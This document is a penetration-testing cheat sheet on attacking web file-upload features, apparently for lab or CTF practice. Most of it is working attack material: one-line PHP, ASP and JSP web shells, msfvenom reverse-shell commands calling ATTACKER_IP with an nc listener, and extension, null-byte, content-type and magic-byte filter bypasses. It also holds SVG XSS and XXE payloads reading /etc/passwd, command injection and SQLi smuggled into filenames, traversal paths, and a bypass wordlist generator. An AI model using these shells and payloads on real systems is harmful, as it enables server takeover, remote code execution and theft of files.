# File Upload Attacks

## Identify Web Framework

```bash
# Check for index page extensions
http://TARGET/index.php
http://TARGET/index.asp
http://TARGET/index.aspx
http://TARGET/index.jsp

# Use Wappalyzer browser extension
# Or fingerprint with curl
curl -I http://TARGET/
```

---

## Web Shells

### PHP

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
# Usage
http://TARGET/uploads/shell.php?cmd=id
```

### ASP

```asp
<% eval request('cmd') %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Location of Pre-made Shells

```bash
/usr/share/webshells/
/usr/share/seclists/Web-Shells/
```

---

## Reverse Shells

### PHP (pentestmonkey)

```bash
# Download and edit IP/PORT
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

# Start listener
nc -lvnp 4444

# Upload and visit shell
```

### Generate with msfvenom

```bash
# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war
```

---

## Bypass Client-Side Validation

### Burp Intercept Method

1. Upload valid image, capture request in Burp
2. Change `filename="image.jpg"` to `filename="shell.php"`
3. Replace file content with web shell
4. Forward request

### Disable JavaScript

1. Open DevTools (F12)
2. Find validation function in source
3. Delete `onchange="checkFile(this)"` from input element
4. Upload shell directly

---

## Bypass Extension Blacklist

### Fuzz for Allowed Extensions

```bash
# PHP alternatives
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps
.pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
.hphp, .ctp, .module

# ASP alternatives
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm
.cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

# JSP alternatives
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```

### Burp Intruder Fuzzing

1. Capture upload request
2. Send to Intruder
3. Mark extension as payload position
4. Load PHP extension wordlist
5. Check response length for successful uploads

---

## Bypass Extension Whitelist

### Double Extension

```
shell.jpg.php
shell.png.php
shell.php.jpg
shell.php.png
```

### Reverse Double Extension

If Apache config has: `<FilesMatch ".+\.ph(ar|p|tml)">`

```
shell.php.jpg    # Passes whitelist, Apache executes as PHP
```

### Character Injection

```bash
# Null byte (PHP < 5.5)
shell.php%00.jpg
shell.php%00.png

# URL encoding
shell.php%20
shell.php%0a
shell.php%0d%0a

# Windows
shell.aspx:.jpg
shell.aspx::$DATA

# Other
shell.php/
shell.php.\
shell.php...
```

### Generate Character Injection Wordlist (Bash)

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Generate Bypass Wordlist (Python)

[file_upload_wordlist_generator.py](https://gist.github.com/ice-wzl/7fa66003ea7d83282880f0efdf17a294)

```python
#!/usr/bin/python3
import argparse

php_ext = [".php", ".php3", ".php4", ".php5", ".php6", ".php7", ".php8",
           ".pht", ".phar", ".phpt", ".pgif", ".phtml", ".phtm", ".php%00"
           ".phps", ".php\\x00", ".inc%"]
special_chars = ["%20", "%0a", "%00", "%0d0a", "/", ".\\", ".", "…", ":"]

def easy_entries(filename: str, known_good: str):
    for ext in php_ext:
        with open("wordlist.txt", "a") as fp:
            fp.write(f"{filename}.{known_good}{ext}\n")
            fp.write(f"{filename}{ext}.{known_good}\n")

def main(args):
    easy_entries(args.filename, args.known_good)
    for char in special_chars:
        for ext in php_ext:
            with open("wordlist.txt", "a") as fp:
                fp.write(f"{args.filename}{char}{ext}.{args.known_good}\n")
                fp.write(f"{args.filename}{ext}{char}.{args.known_good}\n")
                fp.write(f"{args.filename}.{args.known_good}{char}{ext}\n")
                fp.write(f"{args.filename}.{args.known_good}{ext}{char}\n")

if __name__ == '__main__':
    opts = argparse.ArgumentParser(
        description="Generate upload file names for bypassing white and black lists",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    opts.add_argument("-f", "--filename", help="Name of your webshell", required=True, type=str)
    opts.add_argument("-kg", "--known_good", help="Allowed upload extension", required=True, type=str)
    opts.add_argument("-be", "--bypass_extension", help="Extension to bypass", choices=["php"], required=True, type=str)
    args = opts.parse_args()
    main(args)
```

```bash
# Usage
python3 file_upload_wordlist_generator.py -f shell -kg jpg -be php
python3 file_upload_wordlist_generator.py -f myshell -kg gif -be php

# Then use wordlist.txt with Burp Intruder
```

---

## Bypass Content-Type Filter

### Change Content-Type Header

```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

In Burp, change `Content-Type: application/x-php` to `Content-Type: image/jpeg`

---

## Bypass MIME-Type (Magic Bytes)

### Add Magic Bytes to Shell

```bash
# GIF
echo 'GIF8<?php system($_REQUEST["cmd"]); ?>' > shell.php

# PNG (hex)
echo -e '\x89PNG\r\n\x1a\n<?php system($_REQUEST["cmd"]); ?>' > shell.php

# JPEG
echo -e '\xFF\xD8\xFF\xE0<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

### Common Magic Bytes

| File Type | Magic Bytes (Hex) | ASCII |
|-----------|-------------------|-------|
| GIF | `47 49 46 38` | `GIF8` |
| PNG | `89 50 4E 47` | `.PNG` |
| JPEG | `FF D8 FF E0` | N/A |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

---

## SVG Attacks

### XSS via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE via SVG (Read /etc/passwd)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE via SVG (Read Source Code)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

---

## XSS via Image Metadata

```bash
# Inject XSS in Comment field
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' image.jpg

# Verify
exiftool image.jpg | grep Comment
```

---

## Filename Injection

### Command Injection

```bash
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file.jpg;whoami
```

### XSS

```
<script>alert(1)</script>.jpg
```

### SQLi

```
file';select+sleep(5);--.jpg
```

---

## Windows-Specific Attacks

### Reserved Characters

```
shell|.php
shell<.php
shell>.php
shell*.php
shell?.php
```

### Reserved Names

```
CON.php
COM1.php
LPT1.php
NUL.php
```

### 8.3 Filename Convention

```
WEB~1.CON      # May overwrite web.conf
HAC~1.TXT      # References hackthebox.txt
```

---

## Discover Upload Directory

### Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://TARGET/FUZZ -e .php,.asp,.aspx

# Common upload directories
/uploads/
/upload/
/files/
/images/
/attachments/
/media/
/profile_images/
```

### Force Errors

- Upload file with duplicate name
- Upload file with very long name (5000+ chars)
- Send two identical requests simultaneously

---

## Upload Directory Traversal

### Overwrite Files

```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
```

---

## Useful Wordlists

```bash
# PHP extensions
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# ASP extensions
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP

# Web extensions
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Content types
/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
```
